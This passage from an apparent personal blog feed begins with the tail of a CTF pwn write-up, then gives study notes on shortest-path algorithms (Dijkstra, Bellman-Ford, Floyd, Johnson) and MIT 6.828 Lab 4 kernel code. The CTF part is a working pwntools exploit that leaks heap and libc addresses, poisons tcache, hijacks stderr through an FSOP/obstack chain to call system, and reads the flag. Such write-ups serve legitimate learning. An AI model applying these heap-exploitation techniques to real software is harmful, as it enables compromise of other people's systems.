class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(promt,content)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(val))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">short</span>(<span class="params">src,dst,step</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(step))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">src,dst</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">src,dst</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line"></span><br><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive() <span class="keyword">if</span> io.connected() <span class="keyword">else</span> io.close()</span><br><span class="line">one_gadget = <span class="keyword">lambda</span> filename=LIBC: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split()))</span><br><span class="line">dbg = <span class="keyword">lambda</span>: gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x40</span>,<span class="number">0xC0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来的dist块</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">13</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来用来劫持的tcache</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">12</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来用来劫持的tcache</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)<span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#填满tcache,得到unsortedbin</span></span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">12</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">13</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">0x40</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">0x40</span>,<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#放进tcache取出拿堆地址</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">heap_base = p.demangle(p.recvaddress(<span class="string">'bytes'</span>))-<span class="number">0xb60</span></span><br><span class="line">lg(<span class="string">"heap_base"</span>,heap_base)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#切割unsortedbin拿libc_base</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0x18</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x219dd0</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">target = p.libc_base+libc.sym[<span class="string">'stderr'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(p.mangle(heap_base+<span class="number">0x900</span>,target),<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#布置未初始化内存留给short用,0x11为top_idx,劫持tcache的next指针</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,p.p48(<span class="number">0x11</span>),<span class="string">b'\n'</span>])</span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0x18</span>,payload,<span class="string">b'\n'</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#触发任意写</span></span><br><span class="line">short(p.mangle(heap_base+<span class="number">0x900</span>,target),<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#准备FSOP</span></span><br><span class="line">payload = p.obstack_attack(heap_base+<span class="number">0xb50</span>,{<span class="string">'system'</span>:p.system_addr,<span class="string">'io_obstack_jumps'</span>:p.libc_base+<span class="number">0x2163c0</span>})+<span class="string">b'\n'</span></span><br><span class="line"><span class="comment"># print(hex(len(payload)))</span></span><br><span class="line">add(<span class="number">520</span>,<span class="number">1314</span>,<span class="number">0xf0</span>,payload,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持stderr指针</span></span><br><span class="line">add(<span class="number">20</span>,<span class="number">21</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">20</span>,<span class="number">23</span>,<span class="number">0x40</span>,p64(heap_base+<span class="number">0xb50</span>)+<span class="string">b'\n'</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#准备malloc_assert</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">394</span>):</span><br><span class="line">    add(<span class="number">520</span>,<span class="number">1000</span>+i,<span class="number">0xf0</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">520</span>,<span class="number">998</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">520</span>,<span class="number">999</span>,<span class="number">0xa8</span>,<span class="string">'a'</span>*<span class="number">0xa8</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#触发malloc_assert</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(promt,<span class="built_in">str</span>(<span class="number">114514</span>))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">p.recvflag()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最短路径算法</title>
      <link href="/2023/Shortest-Path-Algorithm/"/>
      <url>/2023/Shortest-Path-Algorithm/</url>
      
        <content type="html"><![CDATA[<p>为啥突然开始学算法?详见中华武数杯Shortest_path</p><h1 id="单源最短路径"><a href="#单源最短路径" class="headerlink" title="单源最短路径"></a>单源最短路径</h1><h2 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h2><p>定义一个集合S:从源点到该节点的最短路径已被找到的结点Vi的集合.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172223227.png"><br>一个映射表(map)dist.dist[s,Vi]表示从s出发只经过集合S内的结点到达结点Vi的最短路径长度.(其实对这个算法而言是个数组)</p><p>初始状态集合S中仅有源点s,dist[s,s]=0.向dist数组中添加所有从源点s能直接到达的结点的路径长度.</p><span id="more"></span><p>{<br>找出不在集合S中的结点到s的路径最短的一个:Vj<br>遍历每个不在集合S中的结点(除Vj以外)Vi,如果dist[s,Vi]+Wj,i &lt; dist[s,Vi],意味着通过结点Vj,有一条比只经过S集合到达Vi更短的路径.更新dist并将Vj加入集合S.否则不更新dist将Vj加入集合S.(为了方便理解,调换了算法中将Vj加入集合S这一步骤的顺序)<br>}<br>持续遍历上述括号中的过程,随着集合S的扩大直到S==V,此时dist便表示从s出发到达结点Vi的所有路径最短的一条.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172222684.png"></p><p>简化的例子,求A-&gt;D的最短路径.</p><blockquote><p>从A到D有三条路径,A-&gt;B-&gt;D.A-&gt;C-&gt;D,A-&gt;C.dist中首先将A-&gt;D的路径长度作为<code>未被验证的最短路径</code>(从A直接到达的路径).接下来就是验证这是最短路径.取出A能直接到达的结点中路径最短的一个:C,比较dist[A,C]+Wc,d与dist[A,D],若前者小则更新dist,A-&gt;C-&gt;D成为新的<code>未被验证的最短路径</code>.再取出A能到达的结点中路径次短的一个:B,循环验证,直到从A能直接到达的结点中路径最短的一个是终点D,则完成最短路径的验证.</p></blockquote><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172326277.png"></p><p>该算法就是在不断的进行这一过程,由于该算法是求单源到所有结点的最短路径,所以验证一条最短路径成功后并不停止.</p><p>不能处理负权的原因:当结点Vj加入集合S后,并不会因为Vi-&gt;Vj有负权值的边而更新dist[Vj].该算法有个默认的逻辑:如果A-&gt;B的路径比A-&gt;C的路径长,那么A-&gt;B-&gt;C的路径一定比A-&gt;C长(到一个节点的最短路径必然会经过比它离起点更近的节点),而这个逻辑在负权值存在时不成立.</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><h4 id="纯翻译版–暴力"><a href="#纯翻译版–暴力" class="headerlink" title="纯翻译版–暴力"></a>纯翻译版–暴力</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Edge</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> val,dst;</span><br><span class="line">}Edge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">{</span><br><span class="line">    vector&lt;Edge&gt; edges;</span><br><span class="line">}Node;</span><br><span class="line"></span><br><span class="line">vector&lt;Node&gt; nodes;</span><br><span class="line">vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; dist;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vis;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">if_end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i : vis)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    dist[s] = <span class="number">0</span>;</span><br><span class="line">    vis[s] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> edge:nodes[s].edges)</span><br><span class="line">    {</span><br><span class="line">        dist[edge.dst] = edge.val;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">int</span> min;</span><br><span class="line">        <span class="type">int</span> i,j;</span><br><span class="line">        <span class="comment">//初始化min</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;dist.<span class="built_in">size</span>();++j)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="literal">false</span>)</span><br><span class="line">            {</span><br><span class="line">                min = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//找出不在S中的结点到s的路径最短的一个Vj</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;dist.<span class="built_in">size</span>();++j)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="literal">false</span>&amp;&amp;dist[j]&lt;dist[min])</span><br><span class="line">            {</span><br><span class="line">                min = j;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        j = min;</span><br><span class="line">        vis[j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(if_end())</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//遍历不在每个集合S中的Vi,以经过Vj的路径验证其dist中路径是否最短.</span></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;dist.<span class="built_in">size</span>();++i)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(vis[i]==<span class="literal">false</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> edge:nodes[j].edges)</span><br><span class="line">                {</span><br><span class="line">                    <span class="keyword">if</span>(edge.dst==i)</span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(dist[j]==<span class="number">-1</span>)</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">if</span>(dist[j]+edge.val&lt;dist[i])</span><br><span class="line">                        {</span><br><span class="line">                            dist[i] = dist[j]+edge.val;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Bellman–Ford-算法"><a href="#Bellman–Ford-算法" class="headerlink" title="Bellman–Ford 算法"></a>Bellman–Ford 算法</h2><p>遍历每个结点的每一条出边进行松弛操作(之前在Dijkstra中提到的验证最小路径并更新的操作).持续遍历直到无法进行松弛操作,最多遍历N-1轮.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181707498.png"></p><p>解释一下N-1:每一次松弛使得最短路径的边数至少+1,而最短路径的边数最多是N-1条,故最多N-1次遍历一定能得到最短路径.如果第 N 轮循环时仍然存在能松弛的边，说明从s点出发,能够抵达一个负环。</p><h1 id="全源最短路径"><a href="#全源最短路径" class="headerlink" title="全源最短路径"></a>全源最短路径</h1><h2 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h2><p>oi-wiki上说得挺清楚了,通过一个递推关系,每次还是在比较从x-&gt;y的不通过k的路径和通过k的路径.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181449072.png"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= n; k++) {</span><br><span class="line">  <span class="keyword">for</span> (x = <span class="number">1</span>; x &lt;= n; x++) {</span><br><span class="line">    <span class="keyword">for</span> (y = <span class="number">1</span>; y &lt;= n; y++) {</span><br><span class="line">      f[x][y] = <span class="built_in">min</span>(f[x][y], f[x][k] + f[k][y]);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="应用-图的连通性"><a href="#应用-图的连通性" class="headerlink" title="应用:图的连通性"></a>应用:图的连通性</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181501254.png"></p><h2 id="Johnson-全源最短路径算法"><a href="#Johnson-全源最短路径算法" class="headerlink" title="Johnson 全源最短路径算法"></a>Johnson 全源最短路径算法</h2><p>对有N个结点的无负权有向图,进行N轮Dijkstra算法得到全源最短路径.Johnson全源最短路径算法的精髓在于处理负权值的情况.</p><p>从一个简单的想法出发,既然问题出在负权值,那将每一条边的权值都加上最小权值的绝对值,不就消除了负权值吗?可惜这样做改变了最小路径.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310181631049.png"></p><p>可以发现这样做的问题在于,每一条start-&gt;end的路径长度的增量取决于经过的边的条数,破坏了原有的路径长短关系.<br>推出一个新的想法,找到一个start-&gt;end的不变量,该不变量仅由起点和终点决定而与中途经过的路程无关.物理学上的势能正好符合这一概念.</p><p>先建立一个虚拟结点0,有通向每个结点的权值为0的边,该节点为”零势能面”.然后在其上使用Bellman_Ford算法得到从结点0出发的单源最短路径,到结点i的单源最短路径记作hi.即结点i的势能.修改每一条边的权值为 hi-hj+W(i,j),即加上势能差.显然,这并不破坏路径的长短关系.</p><p>证明了该增量不会破环路径的长短关系后,再来看我们是否达到了消除负权的目的.</p><p>由最短路径的性质: hi + W(i,j) &gt;= hj.<br>于是有: hi-hj+W(i,j) &gt;= 0.<br>成功消除负权,可以正常进行N轮Dijkstra算法.</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://oi-wiki.org/graph/shortest-path">https://oi-wiki.org/graph/shortest-path</a><br><a href="https://zhuanlan.zhihu.com/p/129373740">https://zhuanlan.zhihu.com/p/129373740</a><br><a href="https://www.cnblogs.com/gaochundong/p/bellman_ford_algorithm.html">https://www.cnblogs.com/gaochundong/p/bellman_ford_algorithm.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab4</title>
      <link href="/2023/6.828-Lab4/"/>
      <url>/2023/6.828-Lab4/</url>
      
        <content type="html"><![CDATA[<h1 id="Lec-9"><a href="#Lec-9" class="headerlink" title="Lec 9"></a>Lec 9</h1><h2 id="“Locking”"><a href="#“Locking”" class="headerlink" title="“Locking”"></a>“Locking”</h2><blockquote><p>When we say that a lock protects data, we really mean that the lock protects some<br>collection of invariants that apply to the data. Invariants are properties of data struc-<br>tures that are maintained across operations. Typically, an operation’s correct behavior<br>depends on the invariants being true when the operation begins. The operation may<br>temporarily violate the invariants but must reestablish them before finishing. For ex-<br>ample, in the linked list case, the invariant is that list points at the first node in the<br>list and that each node’s next field points at the next node. The implementation of<br>insert violates this invariant temporarily: in line 15, l points to the next list element,<br>but list does not point at l yet (reestablished at line 16). The race condition we ex-<br>amined above happened because a second CPU executed code that depended on the<br>list invariants while they were (temporarily) violated. Proper use of a lock ensures that<br>only one CPU at a time can operate on the data structure in the critical section, so<br>that no CPU will execute a data structure operation when the data structure’s invari-<br>ants do not hold.</p></blockquote><span id="more"></span><blockquote><p>You can think of locks as serializing concurrent critical sections so that they run<br>one at a time, and thus preserve invariants (assuming they are correct in isolation).<br>You can also think of critical sections as being atomic with respect to each other, so<br>that a critical section that obtains the lock later sees only the complete set of changes<br>from earlier critical sections, and never sees partially-completed updates.</p></blockquote><h2 id="Lab-4-Preemptive-Multitasking"><a href="#Lab-4-Preemptive-Multitasking" class="headerlink" title="Lab 4: Preemptive Multitasking"></a>Lab 4: Preemptive Multitasking</h2><h3 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h3><h4 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h4><p>对称多处理器模型(SMP):<br>引导处理器 （BSP） 负责初始化系统和引导操作系统;应用处理器 （AP） 仅在操作系统启动并运行后由 BSP 激活。哪个处理器是 BSP 由硬件和 BIOS 决定。</p><blockquote><p>We are going to make JOS support “symmetric multiprocessing” (SMP), a multiprocessor model in which all CPUs have equivalent access to system resources such as memory and I/O buses. While all CPUs are functionally identical in SMP, during the boot process they can be classified into two types: the bootstrap processor (BSP) is responsible for initializing the system and for booting the operating system; and the application processors (APs) are activated by the BSP only after the operating system is up and running. Which processor is the BSP is determined by the hardware and the BIOS.</p></blockquote><p>每个CPU有个LAPIC单元,LAPIC单元负责在整个系统中传输中断</p><blockquote><p>In an SMP system, each CPU has an accompanying local APIC (LAPIC) unit. The LAPIC units are responsible for delivering interrupts throughout the system. The LAPIC also provides its connected CPU with a unique identifier. </p></blockquote><h5 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h5><p>映射MMIO.</p><blockquote><p>A processor accesses its LAPIC using memory-mapped I/O (MMIO). In MMIO, a portion of physical memory is hardwired to the registers of some I/O devices, so the same load/store instructions typically used to access memory can be used to access device registers. You’ve already seen one IO hole at physical address 0xA0000 (we use this to write to the VGA display buffer).</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span></span><br><span class="line"><span class="comment">// location.  Return the base of the reserved region.  size does *not*</span></span><br><span class="line"><span class="comment">// have to be multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">mmio_map_region</span><span class="params">(<span class="type">physaddr_t</span> pa, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> base = MMIOBASE;</span><br><span class="line"></span><br><span class="line">size = ROUNDUP(size,PGSIZE);</span><br><span class="line">pa = ROUNDDOWN(pa,PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base + size &gt; MMIOLIM)</span><br><span class="line">        panic(<span class="string">"mmio_map_region: cannot go higher than MMIOLIM!\n"</span>);</span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir,base,size,pa,PTE_PCD|PTE_PWT|PTE_W);</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span>*)(base-size);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>为每一个cpu映射栈空间.<br>注意下方是NCPU而不是ncpu,因为ncpu此时还未初始化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modify mappings in kern_pgdir to support SMP</span></span><br><span class="line"><span class="comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init_mp</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NCPU;++i)</span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> kstacktop_i = KSTACKTOP-i*(KSTKSIZE+KSTKGAP);</span><br><span class="line">boot_map_region(kern_pgdir,kstacktop_i-KSTKSIZE,KSTKSIZE,PADDR(percpu_kstacks[i]),PTE_W|PTE_P);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>为每个CPU设置tss,idr.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap_init_percpu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> id = cpunum();</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP-id*(KSTKGAP+KSTKSIZE);</span><br><span 